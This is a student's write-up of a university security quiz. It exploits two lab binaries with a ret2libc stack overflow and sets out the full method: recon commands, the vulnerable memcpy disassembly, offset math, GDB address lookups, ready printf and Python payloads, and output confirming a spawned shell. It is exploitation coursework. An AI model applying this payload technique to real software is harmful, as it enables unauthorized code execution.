# Quiz 4 — Actual Quiz Day Results (Group 6)

**Student:** `apieri01` | **Date:** 2026-04-24 | **Lab machine:** `103ws15` (`10.16.13.53`)
**Result: BOTH BINARIES SOLVED** — `uid=9992(apieri01)` confirmed live on lab machine.

---

## Summary Table

| Binary | Technique | OFFSET | Result |
|--------|-----------|--------|--------|
| bin.1 | Ret2libc → `system("/bin/sh")` | 56 | `uid=9992(apieri01)` ✅ |
| bin.2 | Ret2libc → `system("/bin/sh")` | 56 | `uid=9992(apieri01)` ✅ |

**Both binaries were identical in structure — same OFFSET, same libc addresses, same exploit file.**

---

## Exploit Commands (printf → file)

Both binaries use the **exact same exploit**:

```bash
printf "68 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x30\xfd\xdf\xb7\xef\xbe\xad\xde\xaa\x0c\xf4\xb7" > exploit.1
printf "68 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x30\xfd\xdf\xb7\xef\xbe\xad\xde\xaa\x0c\xf4\xb7" > exploit.2
```

Payload breakdown:
- `68` = payload size in bytes
- `A` × 56 = padding to overflow `local_buf` and overwrite saved EBP → return address
- `\x30\xfd\xdf\xb7` = `0xb7dffd30` = address of `system()` in libc
- `\xef\xbe\xad\xde` = `0xdeadbeef` = fake return (process segfaults after shell — **normal**)
- `\xaa\x0c\xf4\xb7` = `0xb7f40caa` = address of `"/bin/sh"` string in libc

Run to verify:
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 ./exploit.2
# → uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)
```

---

## Step-by-Step Methodology

### Step 1 — Recon

```bash
readelf -l ./bin.X | grep GNU_STACK
# → RW  (not RWE) = NX is ON → shellcode injection will NOT work

readelf -h ./bin.X | grep Type
# → EXEC = no PIE, fixed addresses

objdump -d ./bin.X | grep stack_chk
# → (no output) = no stack canary
```

Results:
- `GNU_STACK RW` → NX on → shellcode fails → use **ret2libc**
- `ET_EXEC` → fixed addresses → no ASLR concern
- No `__stack_chk_fail` → no canary → overflow reaches return address directly

### Step 2 — Identify the Vulnerability

Function: `display_file()` at `0x080492d6`

```
80492d6:  push %ebp
80492d7:  mov %esp,%ebp
80492d9:  sub $0x38,%esp        ← allocates 0x38 = 56 bytes on stack
...
8049303:  lea -0x38(%ebp),%eax  ← reads SIZE from file into stack var
8049327:  call malloc@plt       ← allocates heap buffer of SIZE bytes
...
804936d:  lea -0x34(%ebp),%eax  ← local_buf starts at EBP-0x34 (52 bytes from EBP)
8049370:  push %eax
8049371:  call memcpy@plt       ← copies SIZE bytes into local_buf — NO BOUNDS CHECK
```

**The bug:** `memcpy(local_buf, heap_buf, SIZE)` with no bounds check. `local_buf` is only
52 bytes from EBP. If `SIZE > 52`, the copy overwrites saved EBP (4 bytes) and then the
return address at EBP+4.

### Step 3 — Calculate OFFSET

From disassembly of `display_file`:
```
lea -0x34(%ebp),%eax   ← buffer starts 0x34 = 52 bytes below EBP
```

```
OFFSET = 0x34 + 4 = 56
         ^^^^   ^
         buf    saved EBP (4 bytes between buf start and ret addr)
```

**Both bin.1 and bin.2 have identical `display_file` code → OFFSET = 56 for both.**

### Step 4 — Find Libc Addresses via GDB

```bash
gdb ./bin.1
(gdb) set env TEMP=1000
(gdb) set exec-wrapper setarch i686 -R --3gb
(gdb) b main
(gdb) run /dev/null
(gdb) p system
# $1 = {<text variable, no debug info>} 0xb7dffd30 <system>
(gdb) find &system, +99999999, "/bin/sh"
# 0xb7f40caa
```

| Symbol | Address |
|--------|---------|
| `system()` | `0xb7dffd30` |
| `"/bin/sh"` | `0xb7f40caa` |

### Step 5 — Build the Exploit (Ret2libc)

Stack layout after overflow:

```
[local_buf 52B][saved EBP 4B][RET ADDR 4B] → normal
[  56 × 'A'  ][  56 × 'A' consumed  ][system()][fake_ret]["/bin/sh" ptr] → exploit
```

```python
import struct

OFFSET  = 56
system  = 0xb7dffd30
binsh   = 0xb7f40caa
fakeret = 0xdeadbeef

payload  = b'A' * OFFSET
payload += struct.pack('<I', system)
payload += struct.pack('<I', fakeret)
payload += struct.pack('<I', binsh)

with open('exploit.1', 'wb') as f:
    f.write(str(len(payload)).encode() + b' ' + payload)
# exploit.1 and exploit.2 are identical
```

Or with `printf` directly:
```bash
printf "68 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x30\xfd\xdf\xb7\xef\xbe\xad\xde\xaa\x0c\xf4\xb7" > exploit.1
cp exploit.1 exploit.2
```

---

## Verification

```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1
# Rendering record (size: 68):
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(   AAAAAAAAAAAA0·߷·····
# uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)

echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 ./exploit.2
# uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)
```

---

## Evidence

| Item | Value |
|------|-------|
| Binaries received | `Apr 24 18:13` (from `~/Downloads/bin.zip`) |
| Exploits created | `Apr 24 18:33` (20 min into quiz) |
| exploit.1 md5 | `460f2083110a8c2c4074645f98dd418a` |
| exploit.2 md5 | `460f2083110a8c2c4074645f98dd418a` (identical) |
| bin.1 md5 | `6c4d81e03d1f6d6239297a4908e9432c` |
| bin.2 md5 | `2486cd588a9fd5146997f34cd2d536dd` |
| Lab machine | `103ws15.in.cs.ucy.ac.cy` (`10.16.13.53`) |
| Exploits on lab | `~/quiz4/exploit.1`, `~/quiz4/exploit.2` |

---

## Why Ret2libc (not ROP or Shellcode)

Both binaries have `mmap@plt` and 24 `movb` instructions (8 gadgets × 3 bytes) in `main()`,
which is the mmap ROP gadget-building pattern seen in the example sets (bin2, g1, bsa).

However, **ret2libc works here regardless** because:
1. NX is on (no shellcode) but no ASLR (`ET_EXEC`, fixed addresses)
2. No stack canary → overflow reaches return address
3. `system()` and `"/bin/sh"` are at fixed addresses in the lab's libc

Ret2libc is simpler and faster than mmap ROP. Since the lab uses ASLR-disabled
execution (`setarch i686 -R --3gb`), libc addresses are deterministic.

---

## Binary Structure (functions present)

```
rnd_env          0x08049266   randomises TEMP-based value
display_file     0x080492d6   ← VULNERABLE (memcpy overflow)
root_menu        0x080493e1
offset           0x0804940a
main             0x0804942a   ← has mmap + movb gadget setup
```

The `offset` function and mmap setup exist but were not needed — ret2libc was sufficient.
